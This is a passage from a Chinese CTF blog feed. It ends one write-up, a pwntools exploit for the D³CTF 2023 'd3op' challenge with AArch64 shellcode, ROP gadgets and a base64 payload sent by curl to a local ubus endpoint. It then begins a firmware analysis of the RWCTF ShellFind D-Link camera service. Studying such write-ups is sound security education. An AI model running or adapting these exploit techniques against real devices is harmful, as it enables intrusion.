shellcraft.aarch64.linux.read(<span class="number">3</span>, <span class="number">0x4a23a4</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.aarch64.linux.write(<span class="number">1</span>, <span class="number">0x4a2398</span>, <span class="number">0x100</span>)</span><br><span class="line">p1 = asm(shellcode)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x200</span>, <span class="string">b'a'</span>)</span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(<span class="number">0x4A3000</span>) + p64(<span class="number">0x4A0000</span>)</span><br><span class="line">p1 = p1.ljust(<span class="number">0x300</span>, <span class="string">b'a'</span>)</span><br><span class="line">p1 += <span class="string">b'{"output": "'</span></span><br><span class="line">p1 = p1.ljust(<span class="number">0x350</span>, <span class="string">b'a'</span>)</span><br><span class="line">p1 += <span class="string">b'"}'</span></span><br><span class="line">p1 = p1.ljust(<span class="number">0x418</span>, <span class="string">b'a'</span>)</span><br><span class="line">p1 += <span class="string">b'\x77\x77\x00\x00'</span></span><br><span class="line">p1 += <span class="string">b'\x1d\x04\x00\x00'</span>   <span class="comment">#0x418 + 0x4 + 1</span></span><br><span class="line">p1 += <span class="string">b'\x84\x05\x00\x00'</span>   <span class="comment">#</span></span><br><span class="line">p1 += <span class="string">b'\x77\x07\x00\x00'</span></span><br><span class="line">p1 += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000040064c : ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line">gadget1 = <span class="number">0x000000000040064c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000417920 : ldr x21, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">gadget2 = <span class="number">0x0000000000417920</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000040a95c : ldr x23, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret</span></span><br><span class="line">gadget3 = <span class="number">0x000000000040a95c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x00000000004598c0 : ldp x19, x20, [sp, #0x10] ; mov x0, x3 ; ldp x29, x30, [sp], #0x50 ; ret</span></span><br><span class="line">gadget4 = <span class="number">0x00000000004598c0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000444e14 : svc #0 ; ldp x21, x22, [sp, #0x20] ; mov w0, w19 ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x40 ; ret</span></span><br><span class="line">gadget6 = <span class="number">0x0000000000444e14</span></span><br><span class="line"><span class="comment"># 0x435338</span></span><br><span class="line">gadget5 = <span class="number">0x435338</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">mov x1, x23</span></span><br><span class="line"><span class="string">mov x0, x19</span></span><br><span class="line"><span class="string">mov x2, x21</span></span><br><span class="line"><span class="string">blr x20</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:00000000004578A8 61 EE 41 F9                   LDR             X1, [X19,#0x3D8]</span></span><br><span class="line"><span class="string">.text:00000000004578AC 60 F2 41 F9                   LDR             X0, [X19,#0x3E0]</span></span><br><span class="line"><span class="string">.text:00000000004578B0 21 00 00 CB                   SUB             X1, X1, X0</span></span><br><span class="line"><span class="string">.text:00000000004578B4 80 00 00 8B                   ADD             X0, X4, X0</span></span><br><span class="line"><span class="string">.text:00000000004578B8 A2 2E FF 97                   BL              sub_423340</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:00000000004579A4 E2 00 80 52                   MOV             W2, #7</span></span><br><span class="line"><span class="string">.text:00000000004579A8 FD 03 00 91                   MOV             X29, SP</span></span><br><span class="line"><span class="string">.text:00000000004579AC 03 48 42 F9                   LDR             X3, [X0,#0x490]</span></span><br><span class="line"><span class="string">.text:00000000004579B0 01 4C 42 F9                   LDR             X1, [X0,#0x498]</span></span><br><span class="line"><span class="string">.text:00000000004579B4 00 50 42 F9                   LDR             X0, [X0,#0x4A0]</span></span><br><span class="line"><span class="string">.text:00000000004579B8 21 00 00 CB                   SUB             X1, X1, X0</span></span><br><span class="line"><span class="string">.text:00000000004579BC 60 00 00 8B                   ADD             X0, X3, X0</span></span><br><span class="line"><span class="string">.text:00000000004579C0 60 2E FF 97                   BL              sub_423340</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">magic_gadget = <span class="number">0x00000000004579A4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000400898 : ldr x0, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret</span></span><br><span class="line">gadget7 = <span class="number">0x0000000000400898</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = <span class="number">0x423340</span></span><br><span class="line">base64_decode_addr = <span class="number">0x4a2098</span></span><br><span class="line"><span class="comment">#p1 += p64(0x00000000004579A4)</span></span><br><span class="line"><span class="comment">#p1 += p64(0x0000000000403ad8)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">p1 += p64(gadget4)</span></span><br><span class="line"><span class="string">p1 += b'\x00' * 0x20</span></span><br><span class="line"><span class="string">p1 += p64(0) + p64(gadget1)</span></span><br><span class="line"><span class="string">p1 += p64(0) + p64(mprotect_addr)</span></span><br><span class="line"><span class="string">p1 += b'\x00' * 0x30</span></span><br><span class="line"><span class="string">p1 += p64(0) + p64(gadget2)</span></span><br><span class="line"><span class="string">p1 += p64(0x4a2000) # x19</span></span><br><span class="line"><span class="string">p1 += p64(0) * 2 + p64(gadget3)</span></span><br><span class="line"><span class="string">p1 += p64(0) * 2 + p64(7) # x21</span></span><br><span class="line"><span class="string">p1 += p64(0)</span></span><br><span class="line"><span class="string">p1 += p64(0) + p64(base64_decode_addr)</span></span><br><span class="line"><span class="string">p1 += p64(0) * 4  + p64(0x7000)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p1 += p64(gadget7)</span><br><span class="line">p1 += <span class="string">b'\x00'</span> * <span class="number">0x20</span></span><br><span class="line">p1 += p64(<span class="number">0</span>) + p64(magic_gadget)</span><br><span class="line">p1 += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(base64_decode_addr + <span class="number">0x200</span> - <span class="number">0x490</span>)</span><br><span class="line">p1 += p64(base64_decode_addr) * <span class="number">5</span></span><br><span class="line"></span><br><span class="line">p1 = base64.b64encode(p1)</span><br><span class="line">ret = <span class="number">0x406550</span></span><br><span class="line"></span><br><span class="line">li(p1)</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'{"input":"'</span> + p1 + <span class="string">b'"}'</span></span><br><span class="line">li(p2)</span><br><span class="line"></span><br><span class="line">r.sendline(p2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>远程如下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'http://127.0.0.1:9999/ubus'</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">'7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADUIACA0gFzhNJBCaDyAiCA0ggIgNIBAADUYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAAAAAAAAwSgAAAAAAAABKAAAAAABhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFheyJvdXRwdXQiOiAiYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEifWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYXd3AAAdBAAAhAUAAHcHAAAAAAAAAAAAAJgIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKR5RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAgeSgAAAAAAmCBKAAAAAACYIEoAAAAAAJggSgAAAAAAmCBKAAAAAACYIEoAAAAAAA=='</span></span><br><span class="line"></span><br><span class="line">shell = <span class="string">'''curl -v -d '{"jsonrpc":"2.0","id":null, "method":"call", "params" : ["00000000000000000000000000000000", "base64", "decode", {"input" : "'''</span> + p1 + <span class="string">'''"}]}' '''</span> + ip</span><br><span class="line"></span><br><span class="line">li(shell)</span><br><span class="line"></span><br><span class="line">system(shell)</span><br></pre></td></tr></tbody></table></figure><p>远程交互如下</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">curl -v -d '{"jsonrpc":"2.0","id":null, "method":"call", "params" : ["00000000000000000000000000000000", "base64", "decode", {"input" : "7sWM0o4trPLuDMDy7g8f+IDzn9Lg/7/y4P/f8uD///LhAwCR4gMfqggHgNIBAADUYACA0oF0hNJBCaDyAiCA0ugHgNIBAADUIACA0gFzhNJBCaDyAiCA0ggIgNIBAADUYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAAAAAAAAwSgAAAAAAAABKAAAAAABhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFheyJvdXRwdXQiOiAiYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEifWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYXd3AAAdBAAAhAUAAHcHAAAAAAAAAAAAAJgIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKR5RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAgeSgAAAAAAmCBKAAAAAACYIEoAAAAAAJggSgAAAAAAmCBKAAAAAACYIEoAAAAAAA=="}]}' http://127.0.0.1:9999/ubus</span><br><span class="line">*   Trying 127.0.0.1:9999...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 9999 (#0)</span><br><span class="line">&gt; POST /ubus HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1:9999</span><br><span class="line">&gt; User-Agent: curl/7.68.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Length: 1721</span><br><span class="line">&gt; Content-Type: application/x-www-form-urlencoded</span><br><span class="line">&gt; Expect: 100-continue</span><br><span class="line">&gt;</span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 100 Continue</span><br><span class="line">* We are completely uploaded and fine</span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Connection: Keep-Alive</span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; Keep-Alive: timeout=20</span><br><span class="line">&lt; Content-Type: application/json</span><br><span class="line">&lt;</span><br><span class="line">* Connection #0 to host 127.0.0.1 left intact</span><br><span class="line">{"jsonrpc":"2.0","id":null,"result":[0,{"output":"flag{This_is_test_flag}\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}]}</span><br></pre></td></tr></tbody></table></figure><p>至此，d3op复盘结束</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到了很多，ubus的通信，如何优雅的使用gadgets（XD</p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;AntCTF-x-D³CTF-2023-d3op复盘笔记&quot;&gt;&lt;a href=&quot;#AntCTF-x-D³CTF-2023-d3op复盘笔记&quot; class=&quot;headerlink&quot; title=&quot;AntCTF x D³</summary>
      
    
    
    
    <category term="WP" scheme="https://www.z1r0.top/categories/WP/"/>
    
    
    <category term="RW" scheme="https://www.z1r0.top/tags/RW/"/>
    
  </entry>
  
  <entry>
    <title>RWCTF 5th ShellFind复现笔记</title>
    <link href="https://www.z1r0.top/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.z1r0.top/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</id>
    <published>2023-04-10T08:10:59.000Z</published>
    <updated>2023-08-17T06:33:48.637Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="RWCTF-5th-ShellFind复现笔记"><a href="#RWCTF-5th-ShellFind复现笔记" class="headerlink" title="RWCTF 5th ShellFind复现笔记"></a>RWCTF 5th ShellFind复现笔记</h1><blockquote><p>题目类型为Pwn，难度描述为 difficulty:Normal，具体描述如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Hello Hacker.</span><br><span class="line">You don't know me, but I know you.</span><br><span class="line">I want to play a game. Here's what happens if you lose.</span><br><span class="line">The device you are watching is hooked into your Saturday and Sunday.</span><br><span class="line">When the timer in the back goes off,</span><br><span class="line">your curiosity will be permanently ripped open.</span><br><span class="line">Think of it like a reverse bear trap.</span><br><span class="line">Here, I'll show you.</span><br><span class="line">There is only one UDP service to shell the device.</span><br><span class="line">It's in the stomach of your cold firmware.</span><br><span class="line">Look around Hacker. Know that I'm not lying.</span><br><span class="line">Better hurry up.</span><br><span class="line">Shell or out, make your choice.</span><br></pre></td></tr></tbody></table></figure><p>题目文件：<a href="https://github.com/Larryxi/rwctf-5th-shellfind">https://github.com/Larryxi/rwctf-5th-shellfind</a></p></blockquote><h2 id="题目远程环境配置"><a href="#题目远程环境配置" class="headerlink" title="题目远程环境配置"></a>题目远程环境配置</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run --name shellfind -d --privileged -p 4444/udp --<span class="built_in">rm</span> 1arry/shellfind</span><br></pre></td></tr></tbody></table></figure><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>首先把题目给的固件解包，然后发现是D-link DCS 960L，再从官网上下载个最新的固件</p><p>最新的固件下载链接：<a href="https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L">https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L</a></p><p>下载之后直接diff比较一下，最大的差距是下面这个</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Binary files squashfs-root/usr/sbin/ipfind and squashfs-root2/usr/sbin/ipfind differ</span><br></pre></td></tr></tbody></table></figure><p>刚好ipfind是udp服务，符合题目描述，所以对这两个文件进行分析</p><p>用bindiff查看一下，发现<code>401ca4</code>这个地方被手动patch过了，属于<code>40172C</code>函数</p><p><img src="/2023/04/10/RWCTF-5th-ShellFind%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/1.png" alt="1"></p><p>现在初步分析之后确定ipfind程序为目标程序</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先完整分析一下ipfind，首先是下面这个部分</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ifname = argv[<span class="number">1</span>];</span><br><span class="line">    v4 = ipfind_pid() &lt; <span class="number">0</span>;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    {</span><br><span class="line">      setup_signal_handlers();</span><br><span class="line">      server_sockfd = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">17</span>);         <span class="comment">// udp</span></span><br><span class="line">      <span class="keyword">if</span> ( server_sockfd == <span class="number">-1</span> )</span><br><span class="line">      {</span><br><span class="line">        my_puts(<span class="string">"Can't get server socket\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br></pre></td></tr></tbody></table></figure><p>如果ipfind正常运行</p><ul><li>注册信号处理函数</li><li>创建udp套接字</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v12.sa_family = <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;v12.sa_data[<span class="number">2</span>], <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">        *v12.sa_data = <span class="number">62720</span>;</span><br><span class="line">        <span class="built_in">strncpy</span>(v13, ifname, <span class="number">0x10</span>u);</span><br><span class="line">        <span class="keyword">if</span> ( setsockopt(server_sockfd, <span class="number">0xFFFF</span>, <span class="number">25</span>, v13, <span class="number">0x20</span>u) &gt;= <span class="number">0</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( setsockopt(server_sockfd, <span class="number">0xFFFF</span>, <span class="number">32</span>, &amp;v9, <span class="number">4u</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( setsockopt(server_sockfd, <span class="number">0xFFFF</span>, <span class="number">4</span>, &amp;v10, <span class="number">4u</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">            {</span><br><span class="line">              <span class="keyword">if</span> ( bind(server_sockfd, &amp;v12, <span class="number">0x10</span>u) &gt;= <span class="number">0</span> )</span><br><span class="line">              {</span><br></pre></td></tr></tbody></table></figure><p>如果套接字创建成功，则绑定到62720端口上</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> {</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> sa_family; <span class="comment">/* address family, AF_xxx */</span></span><br><span class="line"><span class="type">char</span> sa_data[<span class="number">14</span>]; <span class="comment">/* 14 bytes of protocol address */</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>sa_family为2代表是udp，sa_data=62720则代表要绑定到62720端口上</p><p>如果绑定成功就到了最核心的地方</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">sub_4013D0(<span class="string">"IPFind start(%s)...\n"</span>, ifname);</span><br><span class="line">        v18 = user_data;</span><br><span class="line">        v21 = &amp;user_data[<span class="number">17</span>];</span><br><span class="line">        addr_len = &amp;v11;</span><br><span class="line">        v20 = <span class="string">"FIVI"</span>;</span><br><span class="line">        v22 = &amp;v16;</span><br><span class="line">        v23 = &amp;unk_402E90;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          v5 = &amp;v14;</span><br><span class="line">          <span class="keyword">if</span> ( dword_413168 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          {</span><br><span class="line">            *v5 = <span class="number">0</span>;</span><br><span class="line">            v5 += <span class="number">4</span>;</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">while</span> ( v5 != user_data );</span><br><span class="line">          v6 = server_sockfd;</span><br><span class="line">          v14.__fds_bits[server_sockfd &gt;&gt; <span class="number">5</span>] |= <span class="number">1</span> &lt;&lt; server_sockfd;</span><br><span class="line">          <span class="keyword">if</span> ( select(v6 + <span class="number">1</span>, &amp;v14, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( ((v14.__fds_bits[server_sockfd &gt;&gt; <span class="number">5</span>] &gt;&gt; server_sockfd) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">            {</span><br><span class="line">              v11 = <span class="number">16</span>;</span><br><span class="line">              <span class="built_in">memset</span>(user_data, <span class="number">0</span>, <span class="number">0x800</span>u);</span><br><span class="line">              recvfrom(server_sockfd, user_data, <span class="number">0x800</span>u, <span class="number">0</span>, &amp;client_addr, addr_len);</span><br><span class="line">              *&amp;user_data[<span class="number">4</span>] = (*&amp;user_data[<span class="number">4</span>] &lt;&lt; <span class="number">24</span>) | user_data[<span class="number">4</span>] | ((*&amp;user_data[<span class="number">4</span>] &amp; <span class="number">0xFF0000</span>u) &gt;&gt; <span class="number">8</span>) | ((*&amp;user_data[<span class="number">4</span>] &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">              v7 = ((_byteswap_ushort(*&amp;user_data[<span class="number">9</span>]) &lt;&lt; <span class="number">8</span>) | ((user_data[<span class="number">10</span>] | (user_data[<span class="number">9</span>] &lt;&lt; <span class="number">8</span>)) &gt;&gt; <span class="number">8</span>));</span><br><span class="line">              *&amp;user_data[<span class="number">9</span>] = v7;</span><br><span class="line">              *&amp;user_data[<span class="number">11</span>] = (_byteswap_ushort(*&amp;user_data[<span class="number">11</span>]) &lt;&lt; <span class="number">8</span>) | ((user_data[<span class="number">12</span>] | (user_data[<span class="number">11</span>] &lt;&lt; <span class="number">8</span>)) &gt;&gt; <span class="number">8</span>);</span><br><span class="line">              v8 = ((_byteswap_ushort(*&amp;user_data[<span class="number">23</span>]) &lt;&lt; <span class="number">8</span>) | ((user_data[<span class="number">24</span>] | (user_data[<span class="number">23</span>] &lt;&lt; <span class="number">8</span>)) &gt;&gt; <span class="number">8</span>));</span><br><span class="line">              *&amp;user_data[<span class="number">23</span>] = v8;</span><br><span class="line">              v17 = (*&amp;user_data[<span class="number">25</span>] &lt;&lt; <span class="number">24</span>) | user_data[<span class="number">25</span>] | ((*&amp;user_data[<span class="number">25</span>] &amp; <span class="number">0xFF0000</span>u) &gt;&gt; <span class="number">8</span>) | ((*&amp;user_data[<span class="number">25</span>] &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">              *&amp;user_data[<span class="number">25</span>] = v17;</span><br><span class="line">              <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(v18, v20, <span class="number">4u</span>) 